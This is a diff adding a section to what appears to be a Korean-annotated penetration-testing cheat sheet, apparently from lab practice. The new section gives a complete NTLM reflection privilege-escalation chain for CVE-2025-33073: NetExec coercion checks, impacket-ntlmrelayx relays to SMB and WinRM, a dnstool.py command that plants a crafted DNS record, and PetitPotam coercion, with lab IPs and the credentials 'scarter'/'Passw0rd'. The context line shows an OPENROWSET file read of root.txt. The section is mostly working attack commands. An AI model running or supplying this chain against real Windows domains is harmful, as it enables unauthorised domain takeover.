@@ -1041,3 +1041,26 @@ SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_
 ```
 
 </details>
+
+---
+<details>
+  <summary><strong>NTLM Reflection</strong></summary>
+
+- https://www.rbtsec.com/blog/ntlm-reflection-abusing-ntlm-for-privilege-escalation-cve-2025-33073/
+- 
+```
+# 취약점 확인(AD 계정을 획득하면 시도)
+nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus
+
+# 로컬로 오는 인증을 릴레이
+impacket-ntlmrelayx -t wkstn-3.shield.local -smb2support
+impacket-ntlmrelayx -t winrms://wkstn-3.shield.local -smb2support
+
+# localhost DNS 생성
+python3 dnstool.py -u 'shield.local\scarter' -p 'Passw0rd' dc4.shield.local -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d '192.168.115.178' -dns-ip 192.168.115.180
+
+# 인증 시도
+nxc smb 192.168.115.185 -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+```
+  
+</details>
